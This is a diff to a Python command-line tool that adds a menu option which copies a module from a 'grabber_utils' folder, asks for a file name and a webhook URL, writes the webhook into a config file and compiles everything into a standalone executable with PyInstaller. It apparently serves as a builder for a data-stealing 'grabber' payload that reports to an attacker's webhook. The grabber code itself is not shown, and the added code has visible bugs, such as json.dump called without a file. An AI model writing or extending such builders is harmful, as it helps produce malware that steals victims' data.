@@ -17,6 +17,8 @@ try:
   import random
   import sys
   import platform
+  import shutil
+  import json
   def clear_console():
       if os.name == 'nt':  
           os.system('cls')
@@ -232,7 +234,24 @@ try:
         sys.exit()
         pass
     elif choice == 9:
-      print("yet working on")
+      os.mkdir("build")
+      shutil.copy("./grabber_utils/CODE.py", "./build/")
+      filename= input("Name of the file: ")
+      os.rename("./build/CODE.py", f"./build/{filename}.py")
+      webhook_to_cfg = input("webhook: ")
+      webhook_cfg = {
+        "WEBHOOK":webhook_to_cfg
+      }
+      webhook_ready = json.dump(webhook_cfg)
+      with open("./build/CONFIG.json","w") as f:
+        f.write(webhook_ready)
+        f.close()
+      if platform.system() == "Windows":
+        import PyInstaller.__main__
+        PyInstaller.__main__.run(["./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json;.","--clean","--workpath=./build/"])
+      else:
+        import PyInstaller.__main__
+        PyInstaller.__main__.run(["./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.","--clean","--workpath=/build/"])
     elif choice == 99:
         Write.Print(f'''
       ██╗███████╗ ██████╗ ██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
